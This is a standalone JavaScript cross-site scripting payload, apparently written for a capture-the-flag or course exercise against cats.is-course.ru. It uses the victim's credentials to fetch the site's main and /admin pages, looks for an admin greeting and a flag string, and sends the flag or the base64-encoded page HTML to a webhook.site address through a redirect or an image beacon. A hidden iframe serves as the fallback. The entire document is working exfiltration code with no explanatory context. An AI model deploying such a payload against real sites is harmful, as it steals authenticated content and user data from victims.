<script>
console.log('v12');
fetch('https://cats.is-course.ru/', {
    credentials: 'include'
})
.then(r => r.text())
.then(html => {
    if(html.includes('Welcome, admin!')) {
        var flagMatch = html.match(/flag{[^}]+}/);
        if(flagMatch) {
            window.location = "https://webhook.site/ТВОЙ_ID?flag=" + flagMatch[0];
        } else {
            window.location = "https://webhook.site/ТВОЙ_ID?admin_page_found=" + 
                encodeURIComponent(btoa(html.substring(0, 5000)));
        }
    } else {
        fetch('https://cats.is-course.ru/admin', {
            credentials: 'include'
        })
        .then(r => r.text())
        .then(adminHtml => {
            window.location = "https://webhook.site/ТВОЙ_ID?admin_page=" + 
                encodeURIComponent(btoa(adminHtml.substring(0, 5000)));
        });
    }
})
.catch(e => {
    var iframe = document.createElement('iframe');
    iframe.src = 'https://cats.is-course.ru/';
    iframe.style.display = 'none';
    iframe.onload = function() {
        try {
            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            var html = iframeDoc.documentElement.outerHTML;
            if(html.includes('Welcome, admin!')) {
                new Image().src = "https://webhook.site/ТВОЙ_ID?admin_detected_in_iframe";
            }
        } catch(e) {
            new Image().src = "https://webhook.site/ТВОЙ_ID?iframe_error";
        }
    };
    document.body.appendChild(iframe);
});
</script>
